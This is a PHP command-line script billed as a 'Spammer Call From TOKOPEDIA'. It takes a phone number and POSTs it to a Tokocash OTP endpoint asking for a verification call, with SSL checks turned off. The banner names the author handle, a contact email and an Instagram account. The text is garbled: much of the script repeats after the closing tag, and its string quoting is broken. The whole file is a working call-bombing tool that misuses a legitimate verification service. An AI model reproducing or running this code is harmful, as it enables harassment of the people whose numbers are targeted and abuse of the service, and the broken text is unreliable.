<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
"\e[0;36mSpammer Call From TOKOPEDIA" 
"\e[0;36mMod By  :MR.D4PLU17" 
"\e[0;36mContact :mrd4plu17@gmail.com" 
"\e[0;36mAuthor  :MR.D4PLU17" "\e[0;36mSupport :InDoNeSiA CYBER eRoR SyStEm"
"\e[0;36mInstagram :@febryan_ragil"
"\e[0;36mThanks to :ICES TEAM"
"\e[0;36mPesan     :Awali Dengan Doa" [62]
############################################################\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
 "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
"\e[0;36mSpammer Call From TOKOPEDIA" 
"\e[0;36mMod By  :MR.D4PLU17"
"\e[0;36mContact :mrd4plu17@gmail.com"
"\e[0;36mAuthor  :MR.D4PLU17"
"\e[0;36mSupport :InDoNeSiA CYBER eRoR SyStEm"
"\e[0;36mInstagram :@febryan_ragil"
"\e[0;36mThanks to :ICES TEAM"
"\e[0;36mPesan     :Awali Dengan Doa"[62]
##################################